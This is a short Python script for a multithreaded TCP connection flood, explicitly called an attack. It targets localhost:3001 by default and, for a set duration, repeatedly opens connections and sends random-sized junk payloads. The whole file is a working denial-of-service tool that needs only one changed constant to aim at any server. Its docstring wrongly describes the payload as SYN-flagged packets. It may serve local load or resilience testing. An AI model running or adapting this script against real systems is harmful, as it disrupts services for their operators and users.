#!/usr/bin/env python3
import socket
import random
import time
import sys
from concurrent.futures import ThreadPoolExecutor

# Target configuration
TARGET_HOST = 'localhost'
TARGET_PORT = 3001
ATTACK_DURATION = 30  # seconds
NUM_THREADS = 4

def generate_packet():
    """Generate a TCP packet with SYN flag"""
    return b'X' * random.randint(64, 1024)  # Random payload size

def send_flood(thread_id):
    """Send TCP flood packets"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    start_time = time.time()
    packets_sent = 0
    
    print(f"Thread {thread_id} starting attack...")
    
    while time.time() - start_time < ATTACK_DURATION:
        try:
            # Try to establish connection
            sock.connect((TARGET_HOST, TARGET_PORT))
            
            # Send data
            packet = generate_packet()
            sock.send(packet)
            packets_sent += 1
            
            # Close and create new socket
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            
        except socket.error:
            # Connection failed or timed out, create new socket and continue
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            continue
        
        # Small delay to prevent overwhelming local resources
        if packets_sent % 100 == 0:
            time.sleep(0.01)
    
    print(f"Thread {thread_id} sent {packets_sent} packets")
    return packets_sent

def main():
    print(f"Starting TCP flood attack on {TARGET_HOST}:{TARGET_PORT}")
    print(f"Attack duration: {ATTACK_DURATION} seconds")
    print(f"Number of threads: {NUM_THREADS}")
    print("----------------------------------------")
    
    total_packets = 0
    
    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        futures = [executor.submit(send_flood, i) for i in range(NUM_THREADS)]
        for future in futures:
            total_packets += future.result()
    
    print("----------------------------------------")
    print(f"Attack completed. Total packets sent: {total_packets}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
        sys.exit(1) 